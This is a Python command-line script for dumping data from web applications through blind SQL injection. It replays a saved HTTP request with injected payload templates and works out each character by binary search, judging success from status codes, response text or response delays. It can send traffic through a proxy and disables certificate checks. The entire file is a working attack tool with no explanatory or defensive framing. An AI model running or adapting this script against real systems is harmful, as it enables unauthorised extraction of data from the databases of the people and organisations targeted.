import requests
import request_parser as request_parser
import argparse
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def create_argument_parser():
    parser = argparse.ArgumentParser(description="Script for dumping data via Blind SQLi attacks")

    parser.add_argument('-req', required=True, help="Path to the .req file used for making the requests")
    parser.add_argument('-target', required=True, help="The target URL")
    parser.add_argument('-payload', required=True, help="The payload to use with fuzzing values")
    parser.add_argument('-mc', type=int, help="HTTP status code to indicate a successful request")
    parser.add_argument("-fc", type=int, help="HTTP status code to indicate a failed (incorrect guess) request")
    parser.add_argument('-mb', help="Text in the HTTP response body to indicate a successful request")
    parser.add_argument('-mt', type=int, help="HTTP response duration in seconds to indicate a successful request")
    parser.add_argument("-pi", help="Proxy server ip")
    parser.add_argument("-pp", help="Proxy server port")

    return parser


def make_request(payload:str, guess:str) -> dict:
    payload = payload.replace("FUZZ2", guess)
    req_file_path = args.req
    header_lines, body = request_parser.read_req_file(req_file_path)
    method, endpoint, headers = request_parser.parse_headers(header_lines, payload)
    data = ''.join(body)
    
    if args.pi and args.pp:
        ip = args.pi
        port = args.pp
        proxies = {
            "http": f"http://{ip}:{port}",
            "https": f"http://{ip}:{port}"
        }
    else:
        proxies = {}
    
    res = requests.request(method, args.target + endpoint, headers=headers, data=data, proxies=proxies, verify=False)
    if res.elapsed.seconds > 20:
        print("\nResponse taking too long, exiting...")
        print()
        exit(0)
    return {
        "statuscode": res.status_code,
        "body": res.text,
        "headers": res.headers,
        "time": res.elapsed.seconds
    }

def binary_search(index: str, payload: str) -> str:
    
    possible_values = list("0123456789abcdefghijklmnopqrstuvwxyz")
    payload = payload.replace("FUZZ1", index)
    
    low, high = 0, len(possible_values) - 1

    while low <= high:
        mid = (low + high) // 2
        guess = possible_values[mid]
        
        #Print status
        sys.stdout.write(f"\rDump: ({int(index) - 1}/x) {dump + guess}")
        sys.stdout.flush()

        # Check
        res = make_request(payload, guess)

        feedback = ""
        if args.mc:
        # Check by statuscode
            if res["statuscode"] == args.mc:
                feedback = "g"
            elif res["statuscode"] == args.fc:
                check_res = make_request(payload.replace("<", "=").replace(">","="), guess)
                if check_res["statuscode"] == args.mc:
                    feedback = "e"
                else : feedback = "l"
        elif args.mb:
        # Check by response body
            if args.mb in str(res["body"]):
                feedback = "g"
            else:
                check_res = make_request(payload.replace(">", "=").replace("<","="), guess)
                if args.mb in check_res["body"]:
                    feedback = "e"
                else : feedback = "l"
        elif args.mt:
            # Check by response time
            if res["time"] >= args.mt:
                check_res = make_request(payload.replace(">=", "=").replace("<=", "="), guess)
                if check_res["time"] >= args.mt:
                    feedback = "e"
                else:
                    feedback = "g"
            else:
                feedback = "l"

        # Check end
        if len(possible_values[low:high]) == 0 and (feedback == "g" or feedback == "l"):
            sys.stdout.write(f"\rDump: ({int(index) - 1}/{int(index) - 1}) {dump}\n")
            sys.stdout.flush()
            exit(0)

        if feedback == 'e':
            return guess
        elif feedback == 'l':
            high = mid - 1
        else:
            low = mid + 1

if __name__ == "__main__":
    parser = create_argument_parser()
    args = parser.parse_args()

    if args.mc is None and args.mt is None and args.mb is None:
        parser.error("Please specify -mc, -mb or -mt. For more info use -h or --help.")
    if (args.pi and not args.pp) or (args.pp and not args.pi):
        parser.error("Please specify -pi and -pp")
    if (args.mc and not args.fc):
        parser.error("Please specify -fc with -mc")

    global dump
    dump = ""
    with open(args.payload, "r") as fr:
        payload = ""
        for line in fr.readlines():
            payload += line

    # Start dumping
    print(f"Started dump at {time.ctime(time.time())}")
    i = 0
    while True:
        i += 1 # Start from 1 rather than 0
        secret = binary_search(str(i), payload)
        if type(secret) != str:
            print("\nSomething went wrong. Make sure you can ping the target. Exiting...")
            exit(0)
        dump += secret